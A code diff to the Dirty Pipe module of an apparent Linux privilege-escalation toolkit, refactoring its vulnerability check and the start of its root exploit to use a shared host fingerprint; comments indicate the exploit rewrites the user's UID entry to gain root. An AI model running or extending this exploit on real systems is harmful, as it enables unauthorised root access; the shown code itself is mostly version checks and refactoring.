@@ -45,6 +45,7 @@
 #ifdef __linux__
 
 #include "../../core/kernel_range.h"   /* used inside this block only */
+#include "../../core/host.h"
 #include <fcntl.h>
 #include <errno.h>
 #include <sys/stat.h>
@@ -257,22 +258,27 @@ static int dirty_pipe_active_probe(void)
 
 static skeletonkey_result_t dirty_pipe_detect(const struct skeletonkey_ctx *ctx)
 {
-    struct kernel_version v;
-    if (!kernel_version_current(&v)) {
-        fprintf(stderr, "[!] dirty_pipe: could not parse kernel version\n");
+    /* Consult the shared host fingerprint instead of calling
+     * kernel_version_current() ourselves — populated once at startup
+     * and identical across every module's detect(). */
+    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
+    if (!v || v->major == 0) {
+        if (!ctx->json)
+            fprintf(stderr, "[!] dirty_pipe: host fingerprint missing kernel "
+                "version — bailing\n");
         return SKELETONKEY_TEST_ERROR;
     }
 
     /* Bug introduced in 5.8. */
-    if (v.major < 5 || (v.major == 5 && v.minor < 8)) {
+    if (v->major < 5 || (v->major == 5 && v->minor < 8)) {
         if (!ctx->json) {
             fprintf(stderr, "[i] dirty_pipe: kernel %s predates the bug (introduced in 5.8)\n",
-                    v.release);
+                    v->release);
         }
         return SKELETONKEY_OK;
     }
 
-    bool patched_by_version = kernel_range_is_patched(&dirty_pipe_range, &v);
+    bool patched_by_version = kernel_range_is_patched(&dirty_pipe_range, v);
 
     /* Active probe overrides version-only verdict when requested.
      * The version check is necessary-but-not-sufficient: distros
@@ -287,7 +293,7 @@ static skeletonkey_result_t dirty_pipe_detect(const struct skeletonkey_ctx *ctx)
         if (probe == 1) {
             if (!ctx->json) {
                 fprintf(stderr, "[!] dirty_pipe: ACTIVE PROBE CONFIRMED — primitive lands "
-                                "(version %s)\n", v.release);
+                                "(version %s)\n", v->release);
             }
             return SKELETONKEY_VULNERABLE;
         }
@@ -310,14 +316,14 @@ static skeletonkey_result_t dirty_pipe_detect(const struct skeletonkey_ctx *ctx)
     if (patched_by_version) {
         if (!ctx->json) {
             fprintf(stderr, "[+] dirty_pipe: kernel %s is patched (version-only check; "
-                            "use --active to confirm empirically)\n", v.release);
+                            "use --active to confirm empirically)\n", v->release);
         }
         return SKELETONKEY_OK;
     }
     if (!ctx->json) {
         fprintf(stderr, "[!] dirty_pipe: kernel %s appears VULNERABLE (version-only check)\n"
                         "    Confirm empirically: re-run with --scan --active\n",
-                v.release);
+                v->release);
     }
     return SKELETONKEY_VULNERABLE;
 }
@@ -331,16 +337,19 @@ static skeletonkey_result_t dirty_pipe_exploit(const struct skeletonkey_ctx *ctx
         return pre;
     }
 
-    /* Resolve current user. */
+    /* Resolve current user. Consult ctx->host->is_root for the
+     * already-root short-circuit so unit tests can construct a
+     * non-root fingerprint regardless of the test process's real euid. */
+    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
+    if (is_root) {
+        fprintf(stderr, "[i] dirty_pipe: already running as root — nothing to escalate\n");
+        return SKELETONKEY_OK;
+    }
     uid_t euid = geteuid();
     struct passwd *pw = getpwuid(euid);
     if (!pw) {
         fprintf(stderr, "[-] dirty_pipe: getpwuid(%d) failed: %s\n", euid, strerror(errno));
         return SKELETONKEY_TEST_ERROR;
-    }
-    if (euid == 0) {
-        fprintf(stderr, "[i] dirty_pipe: already running as root — nothing to escalate\n");
-        return SKELETONKEY_OK;
     }
 
     /* Find the UID field. Need a 4-digit-or-similar UID we can replace
